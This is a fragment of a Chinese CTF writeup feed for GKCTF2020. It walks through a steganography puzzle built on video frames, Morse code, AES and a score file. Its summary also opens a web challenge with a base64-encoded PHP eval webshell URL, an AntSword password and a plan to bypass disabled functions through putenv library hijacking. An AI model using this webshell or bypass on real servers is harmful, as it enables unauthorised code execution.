class="line">print(f)</span><br></pre></td></tr></table></figure><h3 id="4-Sail-a-boat-down-the-river"><a href="#4-Sail-a-boat-down-the-river" class="headerlink" title="4.Sail a boat down the river"></a>4.Sail a boat down the river</h3><p>直接用命令分解视频</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165220148.png" alt="image-20200526165220148"></p><p>然后从118帧开始观察亮点，短是1帧，长是3帧</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165724934.png" alt="image-20200526165724934"></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span><span class="string">.</span>--<span class="comment">/</span><span class="string">.</span>--<span class="comment">/</span>--<span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="comment">/</span>--<span class="string">.</span><span class="comment">/</span></span><br></pre></td></tr></table></figure><p>摩斯解码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170554507.png" alt="image-20200526170554507"></p><p>第465帧有个二维码，扫码是个百度盘链接</p><p>打开，提取码YW8G</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170728445.png" alt="image-20200526170728445"></p><p>然后玩数独，根据提示得到密钥</p><p><code>52693795149137</code></p><p>加密是AES(hex)，坑点是字符集 <code>gb18030/ISO10126</code></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526172054944.png" alt="image-20200526172054944"></p><p>解开压缩包，得到 <code>逆光vocal.ovex</code>用打谱软件打开就有flag。真心想不到</p>]]></content>
    
    <summary type="html">
    
      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;1-Check-IN&quot;&gt;&lt;a href=&quot;#1-Check-IN&quot; class=&quot;headerlink&quot; title=&quot;1.Check IN&quot;&gt;&lt;/a&gt;1.Check IN&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2020/05/GKCTF2020-Writeup/image-20200524132441686.png&quot; alt=&quot;image-20200524132441686&quot;&gt;&lt;/p&gt;&lt;p&gt;进去就是一个马&lt;/p&gt;&lt;p&gt;执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。&lt;/p&gt;&lt;p&gt;先用蚁剑连接&lt;/p&gt;&lt;p&gt;构造如下URL，&lt;a href=&quot;http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
  </entry>
  
</feed>
